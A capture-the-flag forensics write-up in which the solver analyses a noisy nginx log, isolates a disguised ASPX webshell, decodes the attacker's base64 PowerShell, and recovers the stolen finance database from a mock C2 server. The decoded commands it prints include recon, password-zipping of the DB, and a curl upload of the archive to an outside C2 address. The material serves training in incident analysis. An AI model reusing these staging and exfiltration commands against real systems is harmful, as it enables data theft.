# Не пойман — не медоед (HoneyLeak) — write-up

**Flag:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`
**Class:** Forensics (Baby/Easy) — needle-in-noise access-log analysis → webshell kill-chain → C2
exfil recovery → decrypt the stolen DB. Author @mrvos / SPbCTF.

**The one big lesson of this task:** the *obvious* answer (the 7-Zip password you decode from the
log) is a deliberate trap. The task asks for the secret **inside** the accounting database, so you
have to actually pull the exfiltrated archive off the C2 and decrypt it. Our very first pass fell
for the trap and wrote `avito{S7m!vQ2@rK9Lp4X_2026}` into `FLAG.txt`; the second, independent pass
corrected it after recovering the real DB. Read the whole objective.

---

## 1. The challenge

The bees' **accounting database** vanished from the server. The only evidence saved before the
incident was cleaned up is a single nginx access log:

```
honeyleak_access.log   56,873 lines   nginx "combined" format   03/Jul/2026 15:00–22:59 UTC
```

Reconstruct the thief's actions, find the stolen DB, and determine **what secret the bees were
hiding in the corporate accounting**. That secret is the flag.

---

## 2. Signal in the noise — finding the attacker

The log is deliberately flooded with **scanner decoys** — masscan, sqlmap, ffuf, gobuster, wfuzz,
Nmap NSE, DirBuster, feroxbuster, dirsearch, `python-requests`, `Go-http-client` — each firing
1000–1700 requests at random backup/DB/config paths (`/orders.sql`, `/db_backup.sql`,
`/customers.sqlite`, `/phpMyAdmin-*/`, …), almost all `403/404/405/500`. **Grepping for "DB-ish
paths" is the trap the author built for you:** dozens of IPs do exactly that and none of them
succeed.

The reliable move is to **profile by User-Agent frequency**. Count every UA in the file:

```bash
awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn
awk -F'"' '{print $6}' honeyleak_access.log | sort -u | wc -l      # -> 27 distinct UAs
```

Of the 27 distinct UAs, 26 appear hundreds-to-thousands of times (scanner tools + simulated
browsers + search bots). **Exactly one** appears only **4 times** in the whole 56,873-line file:

```bash
grep -c "Trident/6.0" honeyleak_access.log        # -> 4
```

```
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
```

That rarity *is* the signal. All 4 requests come from IP **`185.193.88.77`** — and the tell that
confirms them is the status code: they return **`200`** on a path everyone else got `403/404` on.

The clever part: that **same IP also fired ~1,166 decoy scanner requests** (using every noisy UA,
all `301/302/403/404/405/500`). The attacker **buried their 4 real hits inside their own recon
noise**:

```bash
grep "185.193.88.77" honeyleak_access.log | wc -l        # 1166
grep "185.193.88.77" honeyleak_access.log | awk -F'"' '{print $3}' | awk '{print $1}' | sort | uniq -c
#    4 200      # <- the real attack
#  111 301  113 302  241 403  478 404  100 405  119 500   # <- self-generated camouflage
```

So the coherent attacker session is not a *different* IP from the scanners — it is the *same* IP,
distinguished only by that unique UA and the four `200`s.

---

## 3. The webshell and the kill-chain

All 4 signal requests hit a **pre-planted ASPX webshell** disguised as an IIS health check, taking
a base64-encoded PowerShell command in the `cmd=` parameter:

```
GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64 PowerShell>   → 200
```

This exact file is never *discovered* by any scanner: 7 other IPs probe the generic
`/aspnet_client/` directory (all `403/404/301`), but none of them ever request `healthcheck.aspx`
itself — the exact filename+param is knowledge the attacker already had (the shell was planted
out-of-band; only GET/HEAD/OPTIONS appear in the log, no upload). `grep -c "healthcheck.aspx"` over
the whole file returns exactly 4, all from `185.193.88.77` with the Trident UA.

Base64-decoding each `cmd=` reconstructs the whole operation, in a tight ~140-second window
(18:40:17 → 18:42:37 UTC), each hit sandwiched between routine scanner noise from the same IP as
camouflage:

| ts (UTC) | decoded command | purpose |
|---|---|---|
| 18:40:17 | `whoami && hostname && ipconfig \| findstr /R "IPv4"` | **recon** — confirm RCE, fingerprint the Windows/IIS box |
| 18:41:05 | `powershell -c "$ts=(Get-Date).ToUniversalTime().ToString('yyyyMMdd_HHmm'); & C:\tools\7z.exe a -tzip (\"C:\Windows\Temp\blob_$ts.tmp\") C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql -pS7m!vQ2@rK9Lp4X_2026"` | **stage** — zip the accounting DB into a password-protected archive |
| 18:42:11 | `powershell -c "$ts=(Get-Date).ToUniversalTime().ToString('yyyyMMdd_HHmm'); curl.exe -F \"file=@C:\Windows\Temp\blob_$ts.tmp\" http://178.154.230.44/upload.php"` | **exfil** — upload the archive to the C2 |
| 18:42:37 | `powershell -c "curl.exe -s http://178.154.230.44/ \| findstr /I blob_"` | **verify** — check the blob landed on the C2 |

From step 2 we already learn two facts that will matter: the DB is
`C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql`, and the 7-Zip password is
`S7m!vQ2@rK9Lp4X_2026`.

---

## 4. The trap: the password is NOT the flag

The tempting answer is `avito{S7m!vQ2@rK9Lp4X_2026}` — the archive password. **It's wrong**, and
it's the intended misdirection. The task asks for the secret *inside* the accounting DB; the
password is only the **key to the archive**. You must actually recover and decrypt the exfiltrated
database. (This is exactly where our first pass stopped and got it wrong — a good reminder to
re-read the objective before submitting.)

Two more traps sit on the exfil path, both designed to make a shallow pass conclude
"unrecoverable":

- **The C2 is a honeypot listing.** `http://178.154.230.44/` is a live nginx autoindex
  (`README.txt`: *"Public index mirror. Auto cleanup disabled."*) of **1,338 decoy `blob_*` files**
  (`.tmp/.log/.txt/.bin/.dat/.cache`), one per minute across the whole day, each filled with
  uniformly high-entropy random bytes and **no archive header**. Grabbing timestamp-matched
  candidates yields only garbage.
- **The attacker's own script has a one-minute filename race.** Step 2 computes `$ts` at 18:41 and
  writes `blob_20260703_1841.tmp`, but step 3 **recomputes** `$ts` at 18:42 and tries to upload
  `blob_20260703_1842.tmp` — a filename that was never created. `curl -F "file=@<missing>"` fails
  locally before any bytes leave the host. And step 4's `findstr blob_` "verification" is a false
  positive: *some* `blob_` always exists on the decoy index. So filtering the C2 by the exfil
  timestamp finds nothing real.

**The right move: ignore filenames, find the archive by its content.** A `7z a -tzip` archive must
start with the ZIP magic `PK\x03\x04` (`50 4b 03 04`). Range-probe the first bytes of all 1,338
blobs and keep the one that matches:

```bash
# for each blob, fetch only bytes 0-3 and look for the ZIP signature
curl -s -r 0-3 http://178.154.230.44/<blob> | xxd
# exactly ONE blob is a ZIP:
#   504b0304   blob_3po654ppbr.log   (12 MB)
```

---

## 5. Decrypt → the secret

```bash
$ curl -s http://178.154.230.44/blob_3po654ppbr.log -o real_blob.bin
$ xxd real_blob.bin | head -1
00000000: 504b 0304 1400 0900 0800 ...            # PK\x03\x04  → ZIP, confirmed
$ unzip -P 'S7m!vQ2@rK9Lp4X_2026' real_blob.bin
  inflating: corp_finance_2026_07_03.sql        (664 B)
  inflating: encrypted_database.dat             (12 MB, decoy — not needed)
```

The 664-byte SQL dump is the "central hive treasury export". It holds a `secrets` table alongside a
flavor `hive_workers` payroll table:

```sql
-- central hive treasury export
CREATE TABLE hive_workers (id, bee_name, role, salary_honey_grams);
INSERT INTO hive_workers VALUES (1,'zhuzha','queen_cfo',172000);
INSERT INTO hive_workers VALUES (2,'maya','pollen_analyst',91000);
INSERT INTO hive_workers VALUES (3,'buzz','comb_controller',108500);

CREATE TABLE secrets (id, k, v);
INSERT INTO secrets VALUES (1,'incident_flag','avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}');
INSERT INTO secrets VALUES (2,'note','rotate legacy IIS endpoints before the badgers notice');
```

The recovered `secrets.incident_flag` is the answer.

---

## 6. Flag

```
avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}
```

---

## 7. Takeaways

1. **Frequency-profile User-Agents** to separate a coherent attacker session from mass scanner
   noise. The rarest UA (4 of 56,873) was the entire signal — and the attacker hid it *inside*
   their own decoy scans from the same IP.
2. **Coherence + a `200` on a path everyone else got `403/404` on** localizes the real foothold (the
   disguised `healthcheck.aspx` webshell) far faster than grepping for "suspicious paths".
3. **Read the whole objective.** The 7-Zip password is a decoy answer; the flag is the secret
   *inside* the DB — you must pull the archive off the C2 and decrypt it. Our first solve stopped at
   the password and was wrong.
4. **Recover artifacts by content, not by name.** The C2 filenames were a dead end (a one-minute
   timestamp race + 1,338 random decoys); the real archive was found purely by its `PK\x03\x04`
   signature via range requests.

---

**Artifacts:** `NOTES.md` (the first pass — reached the password trap) / `NOTES_FABLE.md` (the
independent pass that recovered the real DB and corrected the flag), `real_blob.bin` (the recovered
ZIP), `extract/corp_finance_2026_07_03.sql` (the decrypted dump), `FLAG.txt`.
